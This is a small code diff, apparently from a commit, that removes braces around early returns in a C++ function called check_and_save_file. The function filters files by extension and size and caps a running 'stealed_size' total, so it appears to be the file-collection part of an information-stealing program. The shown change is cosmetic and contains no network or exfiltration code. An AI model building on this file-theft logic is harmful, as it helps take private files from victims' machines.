@@ -40,13 +40,13 @@ void Files::check_and_save_file(const fs::path &path, const fs::path &rel_path, 
         std::string extension = path.extension().string();
         extension.erase(0, 1);
 
-        if (std::find(ALLOWED_EXTENSIONS.begin(), ALLOWED_EXTENSIONS.end(), extension) == ALLOWED_EXTENSIONS.end()) {
+        if (std::find(ALLOWED_EXTENSIONS.begin(), ALLOWED_EXTENSIONS.end(), extension) == ALLOWED_EXTENSIONS.end())
             return;
-        }
 
-        if (fs::file_size(path) > MAX_FILESIZE) {
+
+        if (fs::file_size(path) > MAX_FILESIZE)
             return;
-        }
+
 
         if(this->stealed_size > MAX_STEALED_FILES_SIZE)
             return;
